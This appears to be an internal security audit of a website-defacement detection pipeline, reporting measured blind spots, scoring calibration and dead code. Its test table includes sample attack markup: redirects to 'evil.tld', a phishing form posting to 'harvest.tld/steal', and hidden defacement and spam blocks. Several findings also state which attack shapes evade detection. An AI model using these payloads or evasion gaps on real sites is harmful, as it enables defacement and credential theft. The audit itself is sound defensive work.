- **Cross-subsystem interactions:** the `flagged` cases create alerts + remediation rows from what is a capture defect; `AUDIT-4D-1`/`4B-1` then decide whether anyone ever sees them. The `clean` case is the more dangerous one for operator trust: a site whose artifact directory is empty reads `clean` indefinitely, and `AUDIT-4F-2` shows the frontend renders that as a green `Clean` badge with no degradation cue (only `layer4` carries `degraded`, and `api.ts:312`'s type omits the key entirely).

---

### [DEEPENED] AUDIT-4-6 — CONFIRMED for layer 3, and a genuinely new sub-case for layer 2: **un-hiding** a hidden spam farm scores 0.0 with zero structural churn
- **Original phase:** Audit Phase 4
- **Severity:** **Medium** (unchanged; the layer-2 sub-case is new but same class)
- **Subsystem / file(s):** `backend/worker/detection/dom.py:704-730` (layer 3 `weights`/`churn_score` over added refs only), `:562-568` (layer 2 `sensitive = max(0, cur − base)` per channel), `backend/worker/detection/metadata.py:255` (the layer-6 robots *removal* direction that layer 3 lacks)
- **Verification method:** measurement (3 passes/shape, pstdev 0.00000)
- **Evidence — layer 3, five distinct removal shapes, all exactly 0.0:**
  ```
  remove 1 external script         l3=0.0  removed={script_src:1}        total_added=0  verdict=changed risk=0.2005
  remove ALL external scripts      l3=0.0  removed={script_src:2}        total_added=0  verdict=changed risk=0.2058
  remove the ad <iframe>           l3=0.0  removed={iframe_src:1}        total_added=0  verdict=changed risk=0.2005
  remove the login <form>          l3=0.0  removed={form_action:1}       total_added=0  verdict=changed risk=0.2005
  remove the stylesheet <link>     l3=0.0  removed={link_href:1}         total_added=0  verdict=changed risk=0.2005
  ```
  **CONFIRMED exactly as logged, and generalised: the blind direction is every one of the five reference kinds, including the form and the stylesheet, not just scripts/iframes.**
- **Evidence — layer 2, NEW sub-case (the original phase did not find this):** the sensitive boost is `max(0, current − baseline)` per channel (`dom.py:564-566`), so hidden-element *removals* score nothing; and when the element count is unchanged there is no structural churn to fall back on:
  ```
  hidden SEO farm ADDED (8 links)      l2=0.9963  hidden={baseline:0, current:8}  churn=16  class=content
  hidden SEO farm REMOVED              l2=0.0970  hidden={baseline:8, current:0}  churn=16  class=content
  farm made VISIBLE (style dropped)   l2=0.0000  hidden={baseline:8, current:0}  churn=0   class=none
  ```
  **The third row is the finding: an attacker (or a site) that makes previously-invisible SEO spam visible by deleting the `style="opacity:0"` attribute produces `l2 = 0.0` with `structural_churn = 0` — a completely silent transition from "invisible spam" to "visible spam".** Layer 2's job is precisely to notice hidden→visible transitions, and its one sensitive channel is additive-only.
- **Deeper analysis — the whole class:** every "sensitive" channel in the detection stack is **additive**. Layer 2's `new_scripts/new_iframes/new_hidden`, layer 3's `added_new_domains`, layer 5's signatures (via `_new_text`), layer 8's lexicons (via `_new_text`), fusion's `_RULE_FLOORS` (triggers on `>=`). The one exception is layer 6, which *does* score robots.txt removals (0.15) and header removals (0.3 each) — and that asymmetry is itself evidence the removal direction was recognised for one layer and not the others. Removal-only defacement (strip a site's own login form, strip its analytics consent, strip its WAF challenge) is a real and documented defacement category ("vandalism by deletion") and is currently invisible to layers 2, 3, 5 and 8.
- **Positive control (defensive removal is also silent):** `Cloudflare Turnstile` widget removed (an operator's own security hardening) → `l3 = 0.0`, `l2 = 0.0235`, verdict `changed`, risk 0.2106. The system is symmetric here, which is at least internally consistent — but it means neither the attack nor the legitimate hardening is visible.
- **Cross-subsystem interactions:** `AUDIT-2B-1` (stylesheet bytes never captured) means the `link` removal channel is additionally blind at the source; the DOM-diff tree UI (`dom-diff-tree.tsx`) shows `removed` in evidence so an operator *can* see it after drilling in, but the verdict/risk will never surface it.

---

### [NEW] AUDIT-SA2-3 — Layer 7 is **exactly 0.0** for a cloaked defacement banner on any realistic page size, and the corpus has no partially-cloaked row to catch it
- **Severity:** **Critical** — §6.4's first bullet: a false "clean" on an actual attack pattern. The layer whose module docstring is "A page that serves different content to a search-engine crawler than to a browser UA is cloaking" scores 0.0 for the realistic case.
- **Subsystem / file(s):** `backend/worker/detection/cloaking.py:86-118` (`_variant_cloak_score`), `:62-64` (`_ADD_RAMP_LO = 0.15`, `_REMOVE_RAMP_LO = 0.45`, `_RAMP_HI = 0.85`), `:59` (`_MIN_FOREIGN_TOKENS = 12`)
- **Verification method:** measurement (sweep of reference-page sizes; corpus inspection)
- **Evidence — a full 16-token defacement banner cloaked to the crawler, against a reference of increasing size:**
  ```
  ref tokens  foreign  new_frac  union_div  eff_add  l7 score
          29       16    0.5520     0.3560   0.5520    0.5739
          50       16    0.3200     0.2420   0.3200    0.2429
          86       16    0.1860     0.1570   0.1860    0.0515
         146       16    0.1100     0.0990   0.1100    0.0000   <<< SILENT
         266       16    0.0600     0.0570   0.0600    0.0000   <<< SILENT
         600       16    0.0300     0.0290   0.0300    0.0000   <<< SILENT
  ```
  Real news/corporate/ecommerce pages carry 400–3 000+ unique tokens in their visible text. The additive ramp starts at 0.15 (`_ADD_RAMP_LO`), so **any foreign payload below 15% of the reference token set is unconditionally 0.0.** A defacement banner injected at the bottom of a real page is ~1–6% of its tokens.
- **Evidence — the removal direction is graded very differently (asymmetric, and arguably the wrong way round):**
  ```
  ref=35 var=10 removed=25 union_div=0.7140 l7=0.6607
  ref=50 var=15 removed=35 union_div=0.7000 l7=0.6250
  ref=86 var=25 removed=61 union_div=0.7090 l7=0.6483
  ref=146 var=43 removed=103 union_div=0.7050 l7=0.6387
  ```
  Mobile-served-less (the *legitimate* case the ramp was designed to protect) grades 0.62–0.66; a cloaked defacement on a large page grades 0.0. The `min(1.0, added/|ref|)` normalization is what makes the additive channel scale-invariance collapse on large pages while the union-relative removal channel does not.
- **Evidence — the corpus cannot catch this:** `cloaking_heavy` rows: all 8 have `layer7 = 1.0`. Across all 323 attack rows, only 49 have a non-zero layer 7 (274 are exactly 0.0) and the minimum non-zero is 0.0833. **There is no partially-cloaked row anywhere in the corpus or the dataset**, so the entire 0.0–0.9 range of the additive ramp is unvalidated.
- **Evidence — the grace compounds it:** a 7-token cloaked payload is inside `_MIN_FOREIGN_TOKENS = 12` and is `graced: True` → 0.0 at *any* page size. A minimal cloaked payload (`"hacked by" + "your site"` + a t.me handle) is 7–9 tokens.
- **Evidence — end-to-end, the crawler IS served the defacement and layer 7 reads 0.0:**
  ```
  crawler served the defacement (server-side cloaking)  l7=0.0  worst_div=0.218
  crawler served a DIFFERENT but small footer            l7=0.0  worst_div=0.104
  mobile served LESS content (legit responsive)          l7=0.0  worst_div=0.186
  identical raw HTML to all UAs (client-side geo/A-B)     l7=0.0  worst_div=0.0
  ```
- **Deeper analysis:** the module docstring's own reasoning for the ramp ("A pure knee let crawlers be served up to ~50% foreign content at exactly 0.0 whenever the shared page vocabulary dominated the union") was correct as far as it went, and the additive channel was the right fix — but it was anchored to `added/|ref|`, which makes it a *relative* measure, so a fixed-size injection's signal **decays as the page grows**. The correction the docstring itself notes ("the additive new-token fraction … relative to the reference (which punishes injected spam independent of how much shared base vocabulary dilutes the union)") achieves dilution-immunity for *shared vocabulary* but not for *reference size*. An absolute-mass channel (or a much lower `_ADD_RAMP_LO`, or a grace that scales with page size) is the missing piece. Also note `cloaking.py:117`'s `added == 0` shortcut is **provably redundant** (400-case sweep, 0 behavioural differences) — see the dead-code table.
- **Cross-subsystem interactions:** the cloaked defacement is invisible to layer 7 *and* to layers 2/3/5/8 (the crawler and browser bodies are compared only within one scan, never across scans), so nothing else sees it. `probe.py`'s `googlebot` UA comes from a non-Google IP (AUDIT-3-6's WAF tripwire), so a *legitimate* rate-limit block reads as "not usable" (recorded, not scored) — meaning the FP direction is safe while the FN direction is total.

---

### [NEW] AUDIT-SA2-4 — The committed 646-row dataset's `sanity_benign_quiet` row fuses to 0.6583, and `layer8` alone can never reach the material bar
- **Severity:** **Medium** — a measured calibration inconsistency plus a coverage ceiling, not a shipped false positive by itself
- **Subsystem / file(s):** `backend/worker/detection/training/fusion_dataset.json`, `backend/worker/detection/fusion.py:62-71` (coefficients), `backend/worker/detection/semantics.py`
- **Verification method:** measurement (every row re-fused through the deployed model) + arithmetic
- **Evidence — the single-layer reachability map (the operationally important artifact of this session):**
  ```
  required sum(c*v) to reach risk 0.40 = 5.8416   (intercept = -6.2470, sum|coef| = 68.9090)

  layer                          coef   v@0.40   v@0.50  reaches 0.40 / flags alone
  layer1_hash                   4.408   1.3252   1.4172  False / False
  layer2_dom_structure          1.286   4.5415   4.8567  False / False
  layer3_link_audit             2.438   2.3963   2.5627  False / False
  layer4_visual_diff           26.258   0.2225   0.2379  True  / True
  layer5_signatures            14.521   0.4023   0.4302  True  / True
  layer6_security_metadata      2.588   2.2569   2.4135  False / False
  layer7_cloaking              13.157   0.4440   0.4748  True  / True
  layer8_semantics              4.253   1.3736   1.4690  False / False

  all 8 layers uniformly at 0.0848 -> risk exactly 0.4000   (changed, escalated, not flagged)
  all 8 layers uniformly at 0.10   -> risk 0.6556           (FLAGGED, no single layer alarming)
  ```
  **Consequences:** (a) layers 1, 2, 3, 6 and 8 are *individually incapable* of producing a material-or-worse risk, so any verdict driven by them is an interaction; (b) **layer 8, at its maximum of 1.0, produces only 0.1198** — a page whose entire visible content is replaced scores *lower* than an identical page with a rotating third-party iframe (0.6776). A "complete content takeover with no markup change" is the single largest miss the coefficient table encodes.
- **Evidence — `sanity_benign_quiet = 0.6583`.** This row exists specifically to prove the harness is calibrated (its sibling `sanity_benign_identical` is 0.0021, correct). It is above the default flag threshold. Anyone re-deriving `MATERIAL_CHANGE_RISK` from this dataset and trusting the sanity rows would derive a bar *below* what the sanity rows score.
- **Deeper analysis:** the coefficient spread is extreme — layer 4 (26.26) is **6× layer 2 (1.286)** and **1.8× layer 5 (14.52)**. Layer 4 dominates every composite. I tested the obvious failure mode of that (real render noise + byte churn → false flag) and **could not reproduce it** (see the verified-clean ledger), so the coefficient is defensible for *static* pages. But it means the whole system's sensitivity is set by one noisy channel, and the interactive positives (ads, consent widgets, carousels, cookie banners, `position: sticky` headers) that AUDIT-3-1/3-2 showed can render nondeterministically are exactly where it would fail first. That is a Phase 8 stress concern, not a code defect — flagged for their fixture list.
- **Cross-subsystem interactions:** `AUDIT-4B-3`'s cadence and `should_escalate`'s band are both driven by this scalar; the `escalation_low = 0.40` band is *only* reachable through layer 4, 5, 7 or the rule floors, since 1/2/3/6/8 alone cannot reach it.

---

### [CONFIRMED] AUDIT-2-1 / AUDIT-2-2 / AUDIT-2-3 — Taxonomy gaps re-verified; the evasion scenarios now have measured verdicts
- **Severity:** as logged (AUDIT-2-1 Medium, AUDIT-2-2 High, AUDIT-2-3 Medium) — the reproductions are stronger but the severities hold
- **Subsystem / file(s):** `backend/worker/detection/training/regression_corpus.json` (19 axes, no `nonnative_*` attack axis), `backend/tools/build_regression_corpus.py`, `backend/worker/detection/dom.py:640-676` (`_collect_refs` collects only script/a/link/iframe/form — no `meta`), `backend/worker/detection/signatures.py:120-126` (`extract_visible_text` skips `script`)
- **Verification method:** end-to-end through `run_detection`, 3 passes per shape, pstdev 0.00000
- **Evidence — the 3 "genuinely absent" attack families, constructed and measured:**
  | taxonomy shape | construction | fused | verdict |
  |---|---|---|---|
  | #7 subtle single-word tampering | `morning` → `morning, obviously` | 0.1942 | `changed` |
  | #7 single-WORD meaning reversal | `two weeks` → `two days` | 0.1942 | `changed` |
  | #7 single-word NUMBER swap | `two weeks` → `two secs` | 0.1942 | `changed` |
  | #9 redirect cloaking | `<meta http-equiv='refresh' content='0;url=https://evil.tld/deface'>` | 0.1987 | `changed` |
  | #9 client-side redirect cloak | `<script>location.replace('https://evil.tld/x')</script>` | 0.3153 | `changed` |
  | #10 time-delayed payload | `<div style='display:none'>WE HAVE BEEN HACKED BY DRAGON…` (text in DOM) | **1.0000** | **`flagged`** |
  | #10 time-delayed payload (script-string form) | `setTimeout(…'HACKED BY DRAGON'…,864e5)` | 0.3153 | `changed` |
  | #6 phishing overlay, new domain | fixed-position overlay, `<form action='https://harvest.tld/steal'>` | **0.5450** | **`flagged`** |
  | #6 phishing overlay, same-origin path | fixed-position overlay, `<form action='/verify'>` | 0.2242 | `changed` |
  | #1 defacement banner (POSITIVE CONTROL) | `HACKED BY DRAGON TEAM` + telegram | **1.0000** | **`flagged`** |
  | #3 SEO spam farm (POSITIVE CONTROL) | 6 spam domains + `opacity:0` block | **0.7064** | **`flagged`** |
  | attack **withdrawal** (banner removed) | baseline had the banner | **0.9976** | **`flagged`** (layer4 = 0.296) |
  | phishing overlay **withdrawal** | baseline had the overlay | 0.2249 | `changed` |
- **Findings within this block:**
  1. **#10 (time-delayed) is NOT genuinely absent in the client-side slice** when the payload text is in the DOM as *visible text* — it flags at 1.0 (hidden-element count is the sensitive channel; `display:none` counts as hidden, and layer 5's lexicon runs on new visible text regardless of hiding). It IS absent in the *script-string* form (0.3153). This is a **refinement** of the Phase-2 claim: the previously-"genuinely absent" category is half-present.
  2. **#6 (phishing overlay) is caught only by layer 3's new-domain form channel** (0.5934). A *same-origin* overlay — which is what a real credential-harvest overlay would use against a site whose own login is same-origin, and what an attacker with any write access to the site's own template would use — reads **0.2242, `changed`**. So AUDIT-2-2's "form-action slice only" is confirmed and sharpened: the phishing-overlay slice is caught *only* when the attacker points at a new domain, which is the less likely case.
  3. **Attack withdrawal is caught, and by an unexpected layer.** Removing a banner is a 0.296 layer-4 visual delta → 0.9976 `flagged`. This is a genuine positive result the original phases did not test, and it substantially narrows the practical risk of an attacker "cleaning up" after a hit. It is *asymmetric* though: a phishing overlay's withdrawal only reaches 0.2249 because the overlay's visual footprint was small.
  4. **`nonnative_full_rewrite` / `nonnative_partial_inject` are still absent from the 152-row corpus.** The corpus has exactly 19 axes; `nonnative_editorial` (benign) is present, no non-Latin attack axis is. Confirmed by re-reading `regression_corpus.json.meta.axes`.
- **Cross-subsystem interactions:** the LLM escalation band is *not* entered by any of the evading shapes (all < 0.40), so the second-opinion mechanism provides no backstop for the #7/#9/#10-script families. `AUDIT-2-3`'s remedy (meta-refresh parsing) would also need to cover the *script-string* form, which the log's "parse meta-refresh in layer 3/7" spec does not.

---

### [CONFIRMED] AUDIT-2-5 — `ScanFinding` still has no `degraded` column
- **Severity:** Medium (unchanged)
- **Subsystem / file(s):** `backend/app/models.py:519-548`
- **Verification method:** code-trace (re-read the live model)
- **Evidence:** the `scan_findings` columns are exactly `id, scan_id, layer, layer_key, score, skipped, evidence, created_at` + the `scan` relationship. `'degraded' in <class ScanFinding source> → False`. `worker/scan_tasks.py:212-221` writes only `score` / `skipped` / `evidence`. **CONFIRMED, unchanged.**
- **Deeper analysis:** AUDIT-SA2-5's both-sides-empty case makes this concrete — a scan where *nothing was measured* has `layer2/3/5/8` rows with `score=None, skipped=True` and a `reason` string, which is byte-identical in shape to a layer-4 screenshot loss. A findings-only consumer cannot tell "provably zero" from "dark channel" without parsing free text, even though the parent `scans.layer_scores` JSON *does* carry the boolean. Cross-references AUDIT-4F-2 (the client type omits the key too) and AUDIT-4F-4 (five severity-colour definitions).
- **Cross-subsystem interactions:** `app/routers/sites.py::_has_degraded_layer` and `consecutive_degraded_scans` read the parent's `layer_scores` (works); `app/explain.py` and `worker/alert_tasks.py` read findings evidence (workaround only); the frontend `scan-detail.tsx` reading per-layer findings cannot.

---

### [CONFIRMED] AUDIT-2-6 — `capture_meta["headers"]` is still written and still never read
- **Severity:** Low (unchanged)
- **Subsystem / file(s):** `backend/worker/scan_tasks.py:142` (write), `:197` (the actual layer-6 input is `meta.get("probe_headers")`)
- **Verification method:** repo-wide grep (all 100 `backend/**/*.py` excluding `.venv`)
- **Evidence:** `'\"headers\": result.headers' in scan_tasks.py → True` (the write). `_baseline_page_data` reads `headers=meta.get("probe_headers") or {}` and contains no `meta.get("headers")`. A repo-wide scan for `capture_meta["headers"]` / `get("headers")` found exactly **one** other hit: `app/explain.py:98` — `headers = ev.get("headers") or {}` — which reads layer-6 **evidence**, not `capture_meta`. **CONFIRMED, unchanged.**
- **Deeper analysis:** no new harm; the redundancy is one JSONB column per baseline. Worth folding into the same migration as AUDIT-2-5's `degraded` column if remediation touches either.

---

### [CONFIRMED] AUDIT-4-7 / AUDIT-4-8 — The two handoff specifications still match the code, with three specific corrections
- **Severity:** Medium (unchanged, specification-only)
- **Subsystem / file(s):** `backend/worker/scan_tasks.py:139-156, 334-339`, `backend/worker/detection/types.py:12-43`, `backend/worker/detection/visual.py:110-201`, `backend/worker/detection/dom.py:13-17, 163-263, 359-447`
- **Verification method:** code-trace against the specifications
- **Evidence — the specifications' assumptions still hold:**
  - AUDIT-4-7: `PageData`/`ScanPageData` still carry **no** completeness flags (only `html, screenshot, final_url, http_status, headers, tls, robots_txt, content_hash, ua_variants`); `capture_meta` stores `final_url, http_status, headers, capture_method_version, probe_headers, tls, robots_txt` — still **no** `capped`/`stable`/`scroll_completed`/`capture_quality`; `scan.capture_evidence` is still unread by detection. Layer 4 still top-crops for SSIM (`_common_size`) while pHash/dHash see whole images (`visual.py:162-169`). **Confirmed.**
  - AUDIT-4-8: no stylesheet fetch exists anywhere in `worker/`; `_HiddenContext` still reads only `<style>` `el.text` (`dom.py:373-379`); `stylesheet_chars` is still a single combined count. **Confirmed.**
- **Three corrections the specs got wrong (the kickoff asked me to flag these):**
  1. **AUDIT-4-7's "crop both to the capped extent" for layer 4 is already partly done and is not sufficient alone.** `_common_size` already takes `min(scaled_h(a), scaled_h(b), MAX_COMPARE_HEIGHT)` — the "shorter scaled height" crop. The uncropped part is only the pHash/dHash pair. So the spec's remedy is a *narrowing*, not a new mechanism, and the marginal risk of implementing it as written (re-cropping SSIM) is zero-value churn.
  2. **AUDIT-4-8's point (2) — "run hidden-state resolution on BOTH sides symmetrically so an inline→external refactor does not manufacture a delta" — is already symmetric.** `_tree_stats` builds its own `_HiddenContext(root)` per side (`dom.py:476`) and `hidden_count` is a per-side count. The real exposure is the *absolute* count dropping from N to 0 when rules move to a sheet the capture never fetched — which is the same fact as point (1), not an asymmetry bug. The spec's diagnosis is off even though its conclusion (fetch the bytes) is right.
  3. **AUDIT-4-7's "unstable-DOM / scroll-incomplete captures should flow into fusion as a partial-confidence input" needs a numerical guard the spec does not give.** I measured the degraded-mass machinery: `layer3` at 0.9 with 1 other channel degraded lands at **exactly 0.4000**, and the composite is *not* bounded by `_UNMEASURED_RISK_CEIL` (the ceiling only bounds the intercept-shrinkage *uplift*, `fusion.py:295`). A new partial-confidence scalar must therefore be defined relative to `z_known`, not bolted onto the existing `min(proba_adjusted, …)` line, or a scroll-capped capture on a page with one high layer will land exactly on the cadence bar.
- **Cross-subsystem interactions:** unchanged from the log; both specs remain blocked on their capture-side halves (AUDIT-2B-1, AUDIT-3-5), which are Audit Phase 3's remediation territory.

---

### [CONFIRMED] AUDIT-4F-5 cross-ref — `fusion.py` still asserts 0.35 in two places; plus a repo-wide sweep of the same class
- **Severity:** Low (unchanged, comment-only)
- **Subsystem / file(s):** `backend/worker/detection/fusion.py:40` and `:192`
- **Verification method:** code-trace + a numeric sweep of every numeric claim in a comment across `worker/`
- **Evidence:** byte-exact read of the two lines:
  ```
  fusion.py:40   '(0.35) let alone the default flag threshold (0.5) — degradation lowers'
  fusion.py:192  '# bar / escalation floor (both 0.35) while still lifting a degraded scan'
  ```
  while `llm_escalation.ESCALATION_LOW = 0.40` and `scanning.MATERIAL_CHANGE_RISK = 0.40`. **CONFIRMED, unchanged.** (Note the em-dashes are intact — the `§` characters in the same files are U+00A7 and a byte-level sweep of every `backend/**/*.py` found **zero** stray control characters, so the mojibake I suspected is not present.)
- **Sweep of every numeric claim in a comment across `worker/` — verified each against the live constant:**
  | location | claim | current value | verdict |
  |---|---|---|---|
  | `fusion.py:40`, `:192` | material bar / escalation floor = **0.35** | **0.40** | **DRIFTED** |
  | `fusion.py:164` | "medium patterns weigh 0.55" | `signatures._SIGNATURES_MEDIUM` weight 0.55 | ok |
  | `fusion.py:165` | "profanity bursts cap at 0.6" | `min(0.6, 0.25·hits)` | ok |
  | `fusion.py:168` | "divergence >= 0.85" | floor trigger 0.85 | ok |
  | `fusion.py:173-174` | "Trigger 0.55 … ~0.89 on 1−e^(−0.9w)" | 0.55; 1−e^(−0.801)=0.5511 | ok |
  | `fusion.py:193` | "measured-clean baseline (~0.09)" | l1-only 0.1372, all-zero 0.0019 | **ambiguous/imprecise** (no named constant) |
  | `scan_tasks.py:55-56` | "layer 5/7 >= 0.85 -> 0.90, layer 3 >= 0.55 -> 0.40" | matches `_RULE_FLOORS` exactly | ok |
  | `scan_tasks.py:57-58` | "every attack scenario … scores > 0.02 … **min observed: 0.0518**" | **re-measured from the artifact: min content peak over all 323 attack rows = 0.0518 exactly** (`combined_subthreshold-0015`); 0 rows at or below NOISE_FLOOR | **VERIFIED EXACT** |
  | `scan_tasks.py:48` | "near-zero fused risk (~0.03)" | measured benign churn band 0.19–0.22; l1-only 0.1372 | **DRIFTED** (predates the refit; the figure is now ~7× too low) |
  | `semantics.py:105` | "benign dynamic churn sits at cos >= ~0.93" | measured 0.9299–0.9444 across 6 page sizes | ok (just under) |
  | `semantics.py:107-108` | "partial injections/SEO spam measure ~0.75-0.90" | `drift(0.90)=0.000, drift(0.75)=0.400` | ok |
  | `visual.py:179` | "each <= 0.5 realistically" | measured pHash/dHash norms: render-noise ≤ 0.074; defacement banner 0.352/0.117; full wipe 0.496/0.246 | ok (max 0.496 < 0.5) |
  | `llm_escalation.py:32` | "0.35 admitted benign rows; 0.40 restores an attack-only band" | `ESCALATION_LOW = 0.40` | ok (it *explains* the 0.40) |
  | `probe.py:44` | "Chrome/126 … ~2 years stale" | time-relative claim, not verifiable statically | untested |
  | `metadata.py` module docstring | "removals and semantic regressions … score as downgrades" | **6 of 8 real CSP relaxations score 0.0** (AUDIT-SA2-2) | **DRIFTED (substantive)** |
  | `signatures.py:120-126` / `semantics.py:24-25` | "run on NEW text only, so pages that always contained a term don't flag" | **7 of 9 adversarial shapes make 100% of the page new** (AUDIT-4-1) | **DRIFTED (substantive)** |
  | `visual.py:29-32` | "A pure hue-only recolor lands around 0.15-0.20 … staying below what the fused model would flag on this channel alone" | `layer4` alone at 0.2225 → 0.4002 and at 0.2379 → 0.50; measured hue recolor 0.0 on synthetic input, 0.3093 for a banner overlay | **ok for layer 4 alone, but the sentence omits the `layer1=1.0` context**, where `l4=0.15` → 0.9028 and `l4=0.2` → 0.9681 |
- **Two new drifted claims beyond `fusion.py`:** `scan_tasks.py:48`'s "~0.03" benign-risk figure, and `metadata.py`'s/CLAUDE-level claim that security-header downgrades score. Both belong in the same comment-fix pass.
- **Cross-subsystem interactions:** the two *substantive* drifts are the same drift class as the code findings above (AUDIT-SA2-2, AUDIT-4-1) — the comments are the *symptom*; the defect is in the classifier. The `0.15`/`0.2` visual.py sentence is the most dangerous of the cosmetic ones because it would lead a remediation author to *lower* layer 4's coefficient, which my real-render measurement shows is not the problem.

---

## Verified-clean ledger (Rule 13 — measured, not doc-trusted)

| Area | Verdict | Evidence |
|---|---|---|
| **Layer 4 real render noise** | **SOUND.** The 26.26 coefficient is defensible. | Real Chromium (Playwright 1.61), identical 24-article page, 5 full-page renders at 1366×3442: layer4 = 0.0001 / 0.0001 / 0.0001 / 0.0024 (mean **0.0012**, n=12 pairs, pstdev 0.00115, max 0.0024, ssim 0.9999, chroma 0.0). **18× below the 0.2225 escalation bar.** PNG byte sizes varied 252 004–252 637 (0.25%) with zero pixel-dimension change, and layer 4 correctly ignored it. A CSS-animation variant also read 0.0001. My hypothesis that `l1 + render noise` would flag is **INVALIDATED by measurement** — recorded honestly. |
| Fusion sigmoid | **Numerically safe.** | `_sigmoid` over z ∈ [−1000, +1000] in 0.5 steps: **0 overflows, 0 non-finite, 0 exceptions**. `_sigmoid(1e6)=1.0`, `_sigmoid(±inf)` saturate. The `z<0` branch is needed (it is not dead) because `exp(-z)` overflows for large positive z in the naive form. |
| Fusion monotonicity | **Holds.** | Every coefficient ≥ 0 (enforced at load, `fusion.py:118-120`). With `layer1=1.0, layer4=0.1` as a base, adding evidence at any of 8 layers × 6 magnitudes never lowered the risk. |
| Fusion fallback path | **Preserves the rule floors.** | With `get_fusion_model` forced to raise: layer5=0.9 → 0.9, layer7=0.9 → 0.9, layer3=0.6 → 0.6, layer4=1.0 → 1.0, all with `model = "fallback_max (fusion model unavailable)"` and the floor recorded. The documented "floors survive even a broken fit" contract is met. |
| `layer_result` NaN contract | **Works as documented** | `layer_result(nan, {})` → `score=0.0` with `evidence["score_fault"]`; `layer_result(inf)` → 0.0 + fault; `layer_result(-5.0)` → 0.0; `layer_result(5.0)` → 1.0. All layers route through it (grep: 21 `layer_result` call sites), so negatives/NaN are structurally unreachable from production code. |
| Normalization ReDoS immunity | **TRUE for `normalize.py`** | 18 adversarial documents (5000-deep nesting, 2 MB attribute, malformed entities, null bytes, unclosed tags, comment regex bait, `<template>`/`<noscript>`/`<svg>`/`<math>`, mXSS nested forms, 10 000-timestamp bomb, unterminated quote, processing instructions, 6 MB and 16 MB documents): **zero raises**, max 99.9 ms, and the 6/16 MB documents correctly fail open (original returned, empty summary). |
| Header-removal detection | **Works** | 5 security headers removed → `l6=0.8` → `flagged` 0.6724; 4 removed → `l6=0.8`; `script-src` directive deleted → correctly `weaker`; nonce-only CSP change → `equal`, 0.0. |
| Suppression ReDoS for *common* user patterns | **Immune in practice** | `^(\w+\s?)+$`, `([a-zA-Z]+)*!`, `(.*,)*[0-9]+`, `(\d+)+#`, `\b(\w+\s+){1,20}\bEND\b`, `[A-Z]{3,}` — all ≤ 1.5 ms. Only alternation-based bombs (`(a|aa)+b`) defeat the `regex` module's optimizer. |
| Per-node suppression cost | **Not additive** (corrects the log) | 60 pathological text nodes, one timing-out rule → 2.00 s total, because the `TimeoutError` aborts the whole element loop at the first node. The logged "nodes × 2 s" worst case is unreachable. |
| MiniLM embedder error handling | **Works** | Real MiniLM on empty string, whitespace, punctuation, CJK, emoji, zero-width chars, control chars, digits: always `dim=384, norm=1.0000, no non-finite`. Lone surrogates make `encode` raise `TypeError`, which `embed_text` catches → `None` → the window is excluded, not fatal. An all-zero vector → `cosine_similarity` returns `None` → excluded → `semantic_similarity=None`, `drift=0.0`. |
| `script_tasks` degraded summary vs findings | Unchanged from AUDIT-2-5 | `_summarize_layer_scores` still emits `score/skipped/degraded`; findings still do not. |
| The 152-row corpus guard | **Clean** | 0 of 56 benign rows cross 0.40 or 0.50. |
| The `min observed: 0.0518` comment | **VERIFIED EXACT** | Reproduced from `fusion_dataset.json`. |

---

## Dead Code & Orphan Routines

Proof method: `Select-String` over all 100 `backend/**/*.py` excluding `.venv`, split into production (`worker/`, `app/`, `alembic/`) vs tests/tools, with behavioural A/B proofs where noted. **No orphaned constant was found in any of the 12 detection modules + `hashing.py` + `llm_escalation.py` — all 60+ module constants are read at least once in production.** The dead items are one parameter, two branches, and one redundant set.

| file:line | symbol | kind | proof (grep hits) |
|---|---|---|---|
| `worker/detection/signatures.py:201, 211` | `base_lines` (the `{ln.strip() …}` set in `_new_text`) | **dead local** — provably subsumed by `base_pieces` | Defined at `:201`, read once at `:211`. Behavioural proof: 20 000 random baseline/current pairs (1–3 lines, 1–6 tokens, optional `.`/`?`/`!` terminators) → **0 differences** between the full expression and a version with `base_lines` removed. Argument: a current piece that equals a whole baseline line is *also* a piece of `pieces(baseline)`, so `p not in base_pieces` already excludes it. Reproduced as a regression guard: `TestAUDITSA2x8FusionFacts::test_new_text_base_lines_set_is_provably_dead` (4000 pairs, asserts `diffs == 0` — a future change making it load-bearing will fail this test). |
| `worker/detection/cloaking.py:117` | the `added == 0` arm of `score = s_removed if added == 0 else (…)` | **redundant branch** — the `else` arm already yields `s_removed` for `added == 0` | Behavioural A/B over a 400-case `(n_ref, n_rem)` grid with `added == 0` forced → **0 differences** vs a shortcut-free reimplementation. Argument: when `added == 0` and the grace did not fire, `added >= removed` is `False` (since `removed > 12 > 0`), so the `else` arm already selects `s_removed`. Reproduced: `TestAUDITSA2x6CloakingScaleBlind::test_the_added_zero_shortcut_is_provably_redundant`. |
| `worker/detection/signatures.py:163, 175` | `script_profile(…, sample_cap=None)` parameter | **dead production parameter** (documented API, one test caller) | `sample_cap` appears at `signatures.py:163, 168, 169, 175, 178` plus exactly **one** call site with a value: `tests/test_phase22_signatures_coverage.py:233`. Both production callers (`signatures.py:276, 277`) use the default. The docstring advertises a restriction capability no production path uses. |
| `worker/detection/pipeline.py:84` | `_LAYER_FUNCS["layer4_visual_diff"] = None` | dead dict entry (deliberate placeholder) | `_LAYER_FUNCS[key]` is only dereferenced at `:171` (CONTENT_LAYERS only) and `:177` (the non-content, non-layer-4 branch). The `None` is never called; layer 4 goes through `_visual_diff` at `:168-169`. Intentional, but the entry is a trap for a future refactor. |
| `worker/detection/__init__.py:22-28` | `__all__` omits `degraded_result` | incomplete public surface | `__all__` lists `PageData, ScanPageData, UAVariant, layer_result, skip_result`. `degraded_result` is imported from `types` by **5** production modules (`cloaking`, `fusion`, `metadata`, `pipeline`, `visual`) and is de facto public, but `from worker.detection import *` will not provide it. |
| `tools/build_fusion_dataset.py:622, 628, 639, 651, 664, 681` (and further mutators) | unused function parameters: `ident` in `spam_section`/`ensure_long_page`/`mut_script_new_domain`; `rng` in `ensure_long_page`; `idx` in `mut_sig_strong_banner`/`mut_sig_leet`/`mut_sig_medium_weak`/`mut_script_new_domain` | dead parameters in the dataset generator | `ruff check --select ARG001` on `tools/build_fusion_dataset.py` reports ≥ 6 `ARG001 Unused function argument`. These are build-time only (no runtime cost), but they make the mutator table's uniform `(rng, ident, html, idx)` signature misleading. |
